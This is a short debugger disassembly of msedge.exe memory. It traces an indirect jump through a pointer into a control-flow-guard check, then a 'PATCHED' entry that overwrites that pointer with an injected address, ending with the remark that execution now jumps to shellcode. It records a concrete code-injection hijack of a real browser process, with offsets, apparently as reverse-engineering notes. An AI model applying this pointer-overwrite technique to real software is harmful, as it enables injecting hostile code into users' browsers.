Address=00007FF69E750000
Size=0000000000001000
Party=User
Page Information=msedge.exe
Allocation Type=IMG
Current Protection=-R---
Allocation Protection=ERWC-
---------------------------------------------------------------------------------------
OFFSET:0x00000000001A8AF7
----------------------------------------------------------------------------------------
00007FF69E8F8AF7 | FF25 9B5E1600            | jmp qword ptr ds:[7FF69EA5E998]         |
00007FF69EA5E998 | 4030F45CFA7F0000         | dq 7FFA5CF43040                         |
00007FFA5CF43040 | 49:BB 00001AA2F57D0000   | mov r11,7DF5A21A0000                    |

00007FFA5CF43040 | 49:BB 00001AA2F57D0000   | mov r11,7DF5A21A0000                    |
00007FFA5CF4304A | 4C:8BD0                  | mov r10,rax                             | rax:CreateSmartScreenClient+14D880
00007FFA5CF4304D | 49:C1EA 09               | shr r10,9                               |
00007FFA5CF43051 | 4F:8B1CD3                | mov r11,qword ptr ds:[r11+r10*8]        | r11+r10*8:GetHandleVerifier+20ABA90
00007FFA5CF43055 | 4C:8BD0                  | mov r10,rax                             | rax:CreateSmartScreenClient+14D880
00007FFA5CF43058 | 49:C1EA 03               | shr r10,3                               |
00007FFA5CF4305C | A8 0F                    | test al,F                               |
00007FFA5CF4305E | 75 09                    | jne 7FFA5CF43069                        |
00007FFA5CF43060 | 4D:0FA3D3                | bt r11,r10                              |
00007FFA5CF43064 | 73 0E                    | jae 7FFA5CF43074                        |
00007FFA5CF43066 | 48:FFE0                  | jmp rax                                 | rax:CreateSmartScreenClient+14D880

00007FFA281D1100 | 56                       | push rsi                                |
00007FFA281D1101 | 53                       | push rbx                                | rbx:&"StartCodeInjectionScanningOnIdle"
00007FFA281D1102 | 48:81EC A8000000         | sub rsp,A8                              |

-------------------------------------------------------------------------------------------------
PATCHED:
OFFSET:0x30E998
00007FF69E8F8AF7 | FF25 9B5E1600            | jmp qword ptr ds:[7FF69EA5E998]         |
00007FF69EA5E998 | 4030F45CFA7F0000         | dq  0x1CF63DE00000

AND NOW RIP jumped to the SHELLCODE 







